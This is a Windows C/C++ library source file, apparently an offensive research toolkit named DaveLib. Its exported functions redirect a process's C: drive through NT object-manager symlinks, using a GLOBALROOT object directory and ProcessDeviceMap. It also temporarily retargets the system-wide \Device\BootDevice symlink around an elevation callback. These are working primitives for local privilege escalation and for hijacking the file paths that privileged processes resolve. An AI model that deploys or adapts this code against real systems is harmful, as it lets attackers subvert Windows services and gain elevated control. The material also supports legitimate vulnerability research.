#include <stdio.h>
#include "DaveLib.h"

#pragma comment(lib, "ntdll.lib")
#define STATUS_SUCCESS 0

_RtlInitUnicodeString pRtlInitUnicodeString;
_NtCreateDirectoryObject pNtCreateDirectoryObject;
_NtSetInformationProcess pNtSetInformationProcess;
_NtCreateSymbolicLinkObject pNtCreateSymbolicLinkObject;
_NtOpenDirectoryObject pNtOpenDirectoryObject;
_NtQueryDirectoryObject pNtQueryDirectoryObject;
_NtQuerySymbolicLinkObject pNtQuerySymbolicLinkObject;
_NtOpenSymbolicLinkObject pNtOpenSymbolicLinkObject;
_NtMakeTemporaryObject pNtMakeTemporaryObject;

void LoadApis(void) {
	HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll == NULL) {
		printf("[!] Could not load ntdll.dll\n");
		exit(1);
    }

    pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
    pNtCreateDirectoryObject = (_NtCreateDirectoryObject)GetProcAddress(ntdll, "NtCreateDirectoryObject");
    pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
    pNtCreateSymbolicLinkObject = (_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
    pNtOpenDirectoryObject = (_NtOpenDirectoryObject)GetProcAddress(ntdll, "NtOpenDirectoryObject");
    pNtQueryDirectoryObject = (_NtQueryDirectoryObject)GetProcAddress(ntdll, "NtQueryDirectoryObject");
    pNtQuerySymbolicLinkObject = (_NtQuerySymbolicLinkObject)GetProcAddress(ntdll, "NtQuerySymbolicLinkObject");
    pNtOpenSymbolicLinkObject = (_NtOpenSymbolicLinkObject)GetProcAddress(ntdll, "NtOpenSymbolicLinkObject");
    pNtMakeTemporaryObject = (_NtMakeTemporaryObject)GetProcAddress(ntdll, "NtMakeTemporaryObject");

    if (pRtlInitUnicodeString == NULL ||
        pNtCreateDirectoryObject == NULL ||
        pNtSetInformationProcess == NULL ||
        pNtCreateSymbolicLinkObject == NULL ||
        pNtOpenDirectoryObject == NULL ||
        pNtQueryDirectoryObject == NULL || 
        pNtQuerySymbolicLinkObject == NULL ||
		pNtOpenSymbolicLinkObject == NULL ||
        pNtMakeTemporaryObject == NULL) {

        printf("[!] Could not load all API's\n");
        exit(1);
    }
}

int InitializeProcess(Process* proc, const wchar_t* executable, const wchar_t* args, const wchar_t* currDir, int suspended, HANDLE token) {
    STARTUPINFO startInfo;
    PROCESS_INFORMATION procInfo;
    HANDLE hToken = NULL;
	BOOL freeToken = FALSE;

    memset(&startInfo, 0, sizeof(startInfo));
    startInfo.cb = sizeof(startInfo);
    startInfo.wShowWindow = SW_SHOW;
    startInfo.lpDesktop = (wchar_t*)L"WinSta0\\Default";

    memset(&procInfo, 0, sizeof(procInfo));

	if (token == NULL) {
        if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &token)) {
            fprintf(stderr, "OpenThreadToken failed. Error: %lu\n", GetLastError());
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token)) {
				fprintf(stderr, "OpenProcessToken failed. Error: %lu\n", GetLastError());
				return -1;
            }            
        }
		freeToken = TRUE;
    }

    if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityAnonymous, TokenPrimary, &hToken)) {
        fprintf(stderr, "DuplicateTokenEx failed. Error: %lu\n", GetLastError());
        return -1;
    }

    if (CreateProcessAsUser(hToken, executable, (wchar_t*)args, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | (suspended ? CREATE_SUSPENDED : 0), NULL, currDir, &startInfo, &procInfo)) {
        proc->hProcess = procInfo.hProcess;
        proc->hThread = procInfo.hThread;
    }
    else {
        fprintf(stderr, "Error executing: %ls. Error: %lu\n", executable, GetLastError());
        return -1;
    }
	if (token != NULL && freeToken) {
		CloseHandle(token);
	}
    CloseHandle(hToken);
    return 0;
}

void ResumeProcess(Process* proc) {
	ResumeThread(proc->hThread);
}

void CleanupProcess(Process* proc) {
    if (proc->hProcess) CloseHandle(proc->hProcess);
    if (proc->hThread) CloseHandle(proc->hThread);
}

int OpenProcessByPid(DWORD pid, HANDLE* processHandle) {
    *processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (*processHandle == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error opening process handle. Error: %lu\n", GetLastError());
        return -1;
    }
    return 0;
}

int CreateObjectDirectory(const wchar_t* directoryName, HANDLE* dirHandle) {
    OBJECT_ATTRIBUTES objAttrDir;
    UNICODE_STRING objName;
    NTSTATUS status;

    pRtlInitUnicodeString(&objName, directoryName);
    InitializeObjectAttributes(&objAttrDir, &objName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = pNtCreateDirectoryObject(dirHandle, DIRECTORY_ALL_ACCESS, &objAttrDir);
    if (status != 0) {
        fprintf(stderr, "Error creating Object directory. Status: 0x%lx\n", status);
        return -1;
    }
    return 0;
}

int OpenObjectDirectory(const wchar_t* directoryName, HANDLE* dirHandle) {
    OBJECT_ATTRIBUTES objAttrDir;
    UNICODE_STRING objName;
    NTSTATUS status;

    pRtlInitUnicodeString(&objName, directoryName);
    InitializeObjectAttributes(&objAttrDir, &objName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = pNtOpenDirectoryObject(dirHandle, DIRECTORY_ALL_ACCESS, &objAttrDir);
    if (status != 0) {
        fprintf(stderr, "Error creating Object directory. Status: 0x%lx\n", status);
        return -1;
    }
    return 0;
}

int SetProcessDevMap(HANDLE processHandle, HANDLE dirHandle) {
    NTSTATUS status;

    status = pNtSetInformationProcess(processHandle, (PROCESS_INFORMATION_CLASS)ProcessDeviceMap, &dirHandle, sizeof(dirHandle));
    if (status != 0) {
        fprintf(stderr, "Error setting ProcessDeviceMap. Status: 0x%lx\n", status);
        return -1;
    }
    return 0;
}


LPWSTR GetSymbolicLinkTarget(LPWSTR symLinkName)
{
    printf("(*) Getting old symlink for: %ws\n", symLinkName);

    // build OBJECT_ATTRIBUTES structure to reference and then delete the permanent symbolic link to the driver path
    UNICODE_STRING symlinkPath;
    HANDLE tempSymLinkHandle;
    POBJECT_ATTRIBUTES symlinkObjAttr = (OBJECT_ATTRIBUTES*)malloc(sizeof(OBJECT_ATTRIBUTES));
	if (symlinkObjAttr == NULL)
	{
		fprintf(stderr, "(-) Couldn't allocate memory for OBJECT_ATTRIBUTES structure\n");
		return (LPWSTR)L"";
	}
    PUNICODE_STRING LinkTarget = (PUNICODE_STRING)malloc(sizeof(UNICODE_STRING));
    if (LinkTarget == NULL) {
		fprintf(stderr, "(-) Couldn't allocate memory for UNICODE_STRING structure\n");
		free(symlinkObjAttr);
        return (LPWSTR)L"";
    }
    NTSTATUS status;

    RtlInitUnicodeString(&symlinkPath, symLinkName);
    InitializeObjectAttributes(symlinkObjAttr, &symlinkPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = pNtOpenSymbolicLinkObject(&tempSymLinkHandle, GENERIC_READ, symlinkObjAttr);

	if (!NT_SUCCESS(status))
	{
		fprintf(stderr, "(-) Couldn't open a handle with GENERIC_READ privilege to the symbolic link %ws. Error: 0x%08X\n", symLinkName, status);
		return (LPWSTR)L"";
	}

    wchar_t* buffer = (wchar_t*)malloc(MAX_PATH*sizeof(wchar_t));
    if (buffer == NULL) {
		fprintf(stderr, "(-) Couldn't allocate memory for buffer\n");
		return (LPWSTR)L"";
    }

	memset(buffer, 0, MAX_PATH * sizeof(wchar_t));
    LinkTarget->Buffer = buffer;
    LinkTarget->Length = 0;
    LinkTarget->MaximumLength = MAX_PATH;

    status = pNtQuerySymbolicLinkObject(tempSymLinkHandle, LinkTarget, nullptr);
    if (!NT_SUCCESS(status))
    {
       
        fprintf(stderr, "(-) Couldn't get the target of the symbolic link %ws\n", symLinkName);
        return (LPWSTR)L"";
    }
    printf("(+) Symbolic link target is: %ws\n", LinkTarget->Buffer);
    return (LPWSTR)LinkTarget->Buffer;
}

int CreateNtSymLink(HANDLE dirHandle, const wchar_t* linkName, const wchar_t* targetName, PHANDLE pSymlinkHandle) {
    OBJECT_ATTRIBUTES objAttrLink;
    UNICODE_STRING name;
    UNICODE_STRING target;
    HANDLE symlinkHandle;
    NTSTATUS status;

    pRtlInitUnicodeString(&name, linkName);
    InitializeObjectAttributes(&objAttrLink, &name, OBJ_CASE_INSENSITIVE, dirHandle, NULL);

    pRtlInitUnicodeString(&target, targetName);
    status = pNtCreateSymbolicLinkObject(&symlinkHandle, SYMBOLIC_LINK_ALL_ACCESS, &objAttrLink, &target);
    if (status != 0) {
        fprintf(stderr, "Error creating symbolic link. Status: 0x%lx\n", status);
        return -1;
    }

    *pSymlinkHandle = symlinkHandle;
    return 0;
}


NTSTATUS ChangeSymlink(LPWSTR symLinkName, LPWSTR newDestination) {
#pragma region symlinks
    // build OBJECT_ATTRIBUTES structure to reference and then delete the permanent symbolic link to the driver path
    UNICODE_STRING symlinkPath;
    RtlInitUnicodeString(&symlinkPath, symLinkName);
    OBJECT_ATTRIBUTES symlinkObjAttr{};
    InitializeObjectAttributes(&symlinkObjAttr, &symlinkPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
    
    HANDLE symlinkHandle;

    NTSTATUS status = pNtOpenSymbolicLinkObject(&symlinkHandle, DELETE, &symlinkObjAttr);
    if (status == STATUS_SUCCESS) {
        // NtMakeTemporaryObject is used to decrement the reference count of the symlink object
        status = pNtMakeTemporaryObject(symlinkHandle);
        CloseHandle(symlinkHandle);
        if (status != STATUS_SUCCESS) {
            fwprintf(stderr, L"(-) Couldn't delete the symbolic link %s. Error: 0x%08X\n", symLinkName, status);
            return status;
        }
        else {
            fwprintf(stdout, L"(+) Successfully deleted symbolic link %s\n", symLinkName);
        }
    }
    else {
        fwprintf(stderr, L"(-) Couldn't open a handle with DELETE privilege to the symbolic link %s. Error: 0x%08X\n", symLinkName, status);
        return status;
    }

    UNICODE_STRING target;
    RtlInitUnicodeString(&target, newDestination);
    UNICODE_STRING newSymLinkPath;
    RtlInitUnicodeString(&newSymLinkPath, symLinkName);

    OBJECT_ATTRIBUTES newSymLinkObjAttr{};
    InitializeObjectAttributes(&newSymLinkObjAttr, &newSymLinkPath, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL); // object needs the OBJ_PERMANENT attribute or it will be deleted on exit
    HANDLE newSymLinkHandle;

    status = pNtCreateSymbolicLinkObject(&newSymLinkHandle, SYMBOLIC_LINK_ALL_ACCESS, &newSymLinkObjAttr, &target);
    if (status != STATUS_SUCCESS) {
        fwprintf(stderr, L"(-) Couldn't create new symbolic link %wZ to %wZ. Error: 0x%08X\n", &newSymLinkPath, &target, status);
        return status;
    }
    else {
        fwprintf(stdout, L"(+) Symbolic link %wZ to %wZ created!\n", &newSymLinkPath, &target);
    }
    CloseHandle(newSymLinkHandle); // IMPORTANT!! If the handle is not closed it won't be possible to call this function again to restore the symlink
    return STATUS_SUCCESS;
#pragma endregion symlinks

}


BOOL DirectoryExists(const wchar_t* szPath) {
    DWORD dwAttrib = GetFileAttributesW(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

VOID DirList(const wchar_t* path) {
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    WCHAR dirPath[MAX_PATH];
    WCHAR fullPath[MAX_PATH];

    // Prepare the directory path with a wildcard to list all files
    swprintf(dirPath, MAX_PATH, L"%s\\*", path);

    // Find the first file in the directory
    hFind = FindFirstFileW(dirPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        wprintf(L"FindFirstFile failed (%d)\n", GetLastError());
        return;
    }

    do {
        // Print the name of the file/directory
        swprintf(fullPath, MAX_PATH, L"%s\\%s", path, findFileData.cFileName);
        wprintf(L"%s\n", fullPath);
    } while (FindNextFileW(hFind, &findFileData) != 0);

    // Check for errors during the file search
    if (GetLastError() != ERROR_NO_MORE_FILES) {
        wprintf(L"FindNextFile failed (%d)\n", GetLastError());
    }

    FindClose(hFind);

}

DLLEXPORT int CreateCRedirectedProcess(const wchar_t* executable, const wchar_t* args, const wchar_t* currDir, int suspended, const wchar_t* redirectTo, const wchar_t* ensurePath) {
    Process pProcess;
    HANDLE dirHandle;
    HANDLE hSymlink;
    DWORD pid;
    const wchar_t* dirName = L"\\??\\GLOBALROOT";
    const wchar_t* linkName = L"C:";
    const wchar_t* targetName = redirectTo;

    LoadApis();

    InitializeProcess(&pProcess, executable, args, currDir, suspended, NULL);

    if (CreateObjectDirectory(dirName, &dirHandle) != 0) {
        if (OpenObjectDirectory(dirName, &dirHandle) != 0) {
            return 1;
        }
    }

    if (SetProcessDevMap(pProcess.hProcess, dirHandle) != 0) {
        return 1;
    }

    if (ensurePath != NULL && !DirectoryExists(ensurePath)) {
        printf("[!] Error: Directory %ws does not exist for us to target\n", ensurePath);
        return 5;
    }

    if (CreateNtSymLink(dirHandle, linkName, targetName, &hSymlink) != 0) {
        return 1;
    }

    ResumeProcess(&pProcess);

    CloseHandle(dirHandle);

    printf("(*) Returning ProcessDeviceMap to \\??\n");

    if (OpenObjectDirectory(L"\\??", &dirHandle) != 0) {
        return 1;
    }

    if (SetProcessDevMap(pProcess.hProcess, dirHandle) != 0) {
        return 1;
    }

    CleanupProcess(&pProcess);
    CloseHandle(hSymlink);
    CloseHandle(dirHandle);

    return 0;

}

DLLEXPORT int CreateGlobalCRedirectedCallback(const wchar_t* redirectTo, const wchar_t* ensurePath, LPVOID callback, LPVOID elevateCallback) {
    
    if (elevateCallback != NULL) {
		((void(*)())elevateCallback)();
    }

	LPWSTR BootDevice = (LPWSTR)L"\\Device\\BootDevice";
    printf("(*) Changing the symbolic link: %ws\n", BootDevice);

    LPWSTR oldTarget = GetSymbolicLinkTarget(BootDevice);

    printf("(+) Old Symlink: %ws\n", oldTarget);

    NTSTATUS status = ChangeSymlink(BootDevice, (LPWSTR)redirectTo);
	if (!NT_SUCCESS(status)) {
        goto cleanup;
	}

    if (callback != NULL) {
		((void(*)())callback)();
    }

	Sleep(5000 * 10);

    status = ChangeSymlink(BootDevice, oldTarget);
	if (!NT_SUCCESS(status)) {
        goto cleanup;
	}

	return 0;

cleanup:
    ChangeSymlink(BootDevice, oldTarget);
    return 1;
}


DLLEXPORT int CreateCRedirectedCallback(const wchar_t* redirectTo, const wchar_t* ensurePath, LPVOID callback) {
    Process pProcess;
    HANDLE dirHandle;
    HANDLE hSymlink;
    DWORD pid;
    const wchar_t* dirName = L"\\??\\GLOBALROOT";
    const wchar_t* linkName = L"C:";
    const wchar_t* targetName = redirectTo;

    LoadApis();

	pProcess.hProcess = GetCurrentProcess();
	pProcess.hThread = GetCurrentThread();

    if (CreateObjectDirectory(dirName, &dirHandle) != 0) {
        if (OpenObjectDirectory(dirName, &dirHandle) != 0) {
            return 1;
        }
    }

    if (SetProcessDevMap(pProcess.hProcess, dirHandle) != 0) {
        return 1;
    }

    if (ensurePath != NULL && !DirectoryExists(ensurePath)) {
        printf("[!] Error: Directory %ws does not exist for us to target\n", ensurePath);
        return 5;
    }

    if (CreateNtSymLink(dirHandle, linkName, targetName, &hSymlink) != 0) {
        return 1;
    }

	if (callback != NULL) {
		((void(*)())callback)();
    }

    CloseHandle(dirHandle);

    printf("(*) Returning ProcessDeviceMap to \\??\n");

    if (OpenObjectDirectory(L"\\??", &dirHandle) != 0) {
        return 1;
    }

    if (SetProcessDevMap(pProcess.hProcess, dirHandle) != 0) {
        return 1;
    }

    CleanupProcess(&pProcess);
    CloseHandle(hSymlink);
    CloseHandle(dirHandle);

    return 0;

}



// Path: DaveLib/DaveLib.cpp